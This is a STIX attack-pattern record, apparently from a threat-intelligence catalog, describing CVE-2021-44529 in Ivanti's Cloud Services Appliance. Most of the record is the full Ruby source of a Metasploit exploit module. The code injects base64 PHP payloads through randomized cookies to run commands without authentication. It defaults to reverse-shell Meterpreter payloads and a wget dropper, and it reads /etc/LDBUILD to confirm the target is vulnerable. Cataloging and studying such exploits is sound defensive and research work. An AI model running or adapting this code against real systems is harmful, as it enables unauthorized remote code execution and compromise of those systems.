{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--90a071f0-83d5-41f1-b00b-a64c41302c96",
    "created": "2024-08-14T17:00:05.999897Z",
    "modified": "2024-08-14T17:00:05.999901Z",
    "name": "Ivanti Cloud Services Appliance (CSA) Command Injection",
    "description": " This module exploits a command injection vulnerability in the Ivanti Cloud Services Appliance (CSA) for Ivanti Endpoint Manager. A cookie based code injection vulnerability in the Cloud Services Appliance before `4.6.0-512` allows an unauthenticated user to execute arbitrary code with limited permissions. Successful exploitation results in command execution as the `nobody` user.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/ivanti_csa_unauth_rce_cve_2021_44529.rb",
            "external_id": "ivanti_csa_unauth_rce_cve_2021_44529.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2021-44529"
        },
        {
            "source_name": "reference",
            "url": "https://forums.ivanti.com/s/article/SA-2021-12-02"
        },
        {
            "source_name": "reference",
            "url": "https://attackerkb.com/topics/XTKrwlZd7p/cve-2021-44529"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Ivanti Cloud Services Appliance (CSA) Command Injection',\n        'Description' => %q{\n          This module exploits a command injection vulnerability in the Ivanti Cloud Services Appliance (CSA)\n          for Ivanti Endpoint Manager. A cookie based code injection vulnerability in the\n          Cloud Services Appliance before `4.6.0-512` allows an unauthenticated user to\n          execute arbitrary code with limited permissions. Successful exploitation results\n          in command execution as the `nobody` user.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Jakub Kramarz', # Discovery\n          'h00die-gr3y <h00die.gr3y[at]gmail.com>' # MSF Module contributor\n        ],\n        'References' => [\n          ['CVE', '2021-44529'],\n          ['URL', 'https://forums.ivanti.com/s/article/SA-2021-12-02'],\n          ['URL', 'https://attackerkb.com/topics/XTKrwlZd7p/cve-2021-44529'],\n          ['EDB', '50833'],\n          ['PACKETSTORM', '166383']\n        ],\n        'DisclosureDate' => '2021-12-02',\n        'Platform' => ['unix', 'linux', 'php'],\n        'Arch' => [ARCH_CMD, ARCH_X64, ARCH_PHP],\n        'Privileged' => false,\n        'Targets' => [\n          [\n            'Unix Command',\n            {\n              'Platform' => 'unix',\n              'Arch' => ARCH_CMD,\n              'Type' => :unix_cmd,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'cmd/unix/python/meterpreter/reverse_http'\n              }\n            }\n          ],\n          [\n            'PHP Command',\n            {\n              'Platform' => 'php',\n              'Arch' => ARCH_PHP,\n              'Type' => :php_cmd,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'php/meterpreter/reverse_tcp'\n              }\n            }\n          ],\n          [\n            'Linux Dropper',\n            {\n              'Platform' => 'linux',\n              'Arch' => [ARCH_X64],\n              'Type' => :linux_dropper,\n              'CmdStagerFlavor' => ['wget', 'printf', 'echo'],\n              'DefaultOptions' => {\n                'PAYLOAD' => 'linux/x64/meterpreter_reverse_http'\n              }\n            }\n          ]\n        ],\n        'Payload' => {\n          'BadChars' => '\"' # We use this to denote the payload as a string so having it in the payload would escape things.\n        },\n        'DefaultTarget' => 0,\n        'DefaultOptions' => {\n          'RPORT' => 443,\n          'SSL' => true\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]\n        }\n      )\n    )\n  end\n\n  # Randomize the cookie pairs for the request.\n  def randomize_cookie(payload)\n    # Number of cookie pairs should be at least 4, and the first cookie pair should\n    # always have the value 'ab'. Note that the Nth cookie in the request, where\n    # N=no_of_cookies-2, should contain the payload.\n    #\n    # example 1: Cookie: sG34st=ab;g3sBdnn=<PAYLOAD>;h4hYyeEe=;j7sJJjjs=;\n    # example 2: Cookie: dvDfR6F=ab;bxvGE=;Fs=<PAYLOAD>;uEn44Nkk=;nnXk=;\n    no_of_cookies = rand(4..8)\n    cookie_name = Rex::Text.rand_text_alphanumeric(1..8)\n    payload_cookie_number = (no_of_cookies - 2)\n    random_cookie = \"#{cookie_name}=ab;\"\n    for cookie_no in 2..no_of_cookies do\n      cookie_name = Rex::Text.rand_text_alphanumeric(1..8)\n      if cookie_no == payload_cookie_number\n        random_cookie << \"#{cookie_name}=#{payload};\"\n      else\n        random_cookie << \"#{cookie_name}=;\"\n      end\n    end\n\n    return random_cookie\n  end\n\n  def check_vuln\n    # check RCE by grabbing CSA version banner stored on /etc/LDBUILD\n    payload = Base64.strict_encode64('readfile(\"/etc/LDBUILD\");')\n    cookie_payload = randomize_cookie(payload)\n\n    return send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'client', 'index.php'),\n      'cookie' => cookie_payload.to_s\n    })\n  rescue StandardError => e\n    elog(\"#{peer} - Communication error occurred: #{e.message}\", error: e)\n    return nil\n  end\n\n  def execute_command(cmd, _opts = {})\n    case target['Type']\n    when :unix_cmd\n      payload = Base64.strict_encode64(\"system(\\\"#{cmd}\\\");\")\n    when :php_cmd\n      payload = Base64.strict_encode64(cmd.to_s)\n    when :linux_dropper\n      payload = Base64.strict_encode64(\"system(\\\"#{cmd}\\\");\")\n    end\n    cookie_payload = randomize_cookie(payload)\n\n    return send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'client', 'index.php'),\n      'cookie' => cookie_payload.to_s\n    })\n  rescue StandardError => e\n    elog(\"#{peer} - Communication error occurred: #{e.message}\", error: e)\n    fail_with(Failure::Unknown, \"Communication error occurred: #{e.message}\")\n  end\n\n  def check\n    print_status(\"Checking if #{peer} can be exploited.\")\n    res = check_vuln\n    return CheckCode::Unknown('No response received from the target.') unless res\n    return CheckCode::Safe unless res.code == 200 && !res.body.blank? && res.body =~ /<c123>/\n\n    begin\n      parsed_html = Nokogiri::HTML.parse(res.body)\n    rescue Nokogiri::SyntaxError => e\n      return CheckCode::Unknown(\"Unable to parse the HTTP response! Error: #{e}\")\n    end\n    csa_version = parsed_html.at_css('c123')\n    if csa_version&.text&.blank?\n      CheckCode::Vulnerable('Could not retrieve version.')\n    else\n      CheckCode::Vulnerable(\"Version: #{csa_version.text}\")\n    end\n  end\n\n  def exploit\n    case target['Type']\n    when :unix_cmd\n      print_status(\"Executing #{target.name} with #{payload.encoded}\")\n      execute_command(payload.encoded)\n    when :php_cmd\n      print_status(\"Executing #{target.name} with #{payload.encoded}\")\n      execute_command(payload.encoded)\n    when :linux_dropper\n      print_status(\"Executing #{target.name}\")\n      execute_cmdstager(linemax: 262144)\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2021-12-02",
    "x_mitre_platforms": [
        "linux'"
    ]
}